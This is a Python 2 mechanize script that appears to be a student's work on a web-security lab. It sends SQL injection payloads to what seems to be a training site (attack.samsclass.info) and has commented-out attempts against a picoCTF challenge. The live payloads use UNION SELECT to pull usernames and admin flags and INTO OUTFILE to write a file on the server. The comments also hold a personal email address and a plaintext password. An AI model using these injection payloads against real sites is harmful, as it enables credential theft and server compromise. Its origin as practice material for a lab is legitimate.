import mechanize
import cookielib
import getpass
import urllib
import re
from BeautifulSoup import BeautifulSoup

def grep(text, search):
    for line in text:
        if re.search(search, line) is None:
            sys.stdout.write(line)
username = 'behnam.rasoulian@gmail.com'
br = mechanize.Browser()

cj = cookielib.LWPCookieJar()
br.set_cookiejar(cj)

# Browser options
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)


br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

#post_url = 'http://rapidbaz.ir/rspa/framework/Controller.php'
#post_url = 'https://www.cheapoair.com/fpnext/air/remotesearch?&yt=0&from=ATL&to=WAS&fromDt=06/19/2018&toDt=06/29/2018&fromTm=1100&toTm=1100&rt=true&daan=&raan=&dst=&rst=&ad=1&se=0&ch=0&infl=0&infs=0&class=1&airpref=&preftyp=1&searchflxdt=false&IsNS=false&searchflxarpt=false&childAge=&prefT=false'
#params = {'password___lpass': 'mynameisbehnam', 'text___luser': 'mardas'}
#data = urllib.urlencode(params)
#data ='?&yt=0&from=ATL&to=WAS&fromDt=06/19/2018&toDt=06/29/2018&fromTm=1100&toTm=1100&rt=true&daan=&raan=&dst=&rst=&ad=1&se=0&ch=0&infl=0&infs=0&class=1&airpref=&preftyp=1&searchflxdt=false&IsNS=false&searchflxarpt=false&childAge=&prefT=false'
##print data
#request = mechanize.Request( post_url )
#response = mechanize.urlopen(request, data=data)
#print response.read()

#post_url = 'http://shell2017.picoctf.com:35895/login'
#params = {'pword_valid': 'true'}
#data = urllib.urlencode(params)
#print data
#request = mechanize.Request( post_url)
#response = mechanize.urlopen(request, data=data)
#print response.read()
query = 'SELECT COLUMN_NAME, TABLE_NAME,table_schema FROM INFORMATION_SCHEMA.COLUMNS;'
query = '\' union select concat(username, \':\', isadmin) as username from sqlol.users where isadmin=\'1'
query = '\' union select \'Mardas\' into outfile \'/tmp/p19winner'
query = query.replace(' ', '+')
url = 'https://attack.samsclass.info/sqlol-raw/search-name.php?q=%s'%query
print url
page = br.open(url)
print page.read()
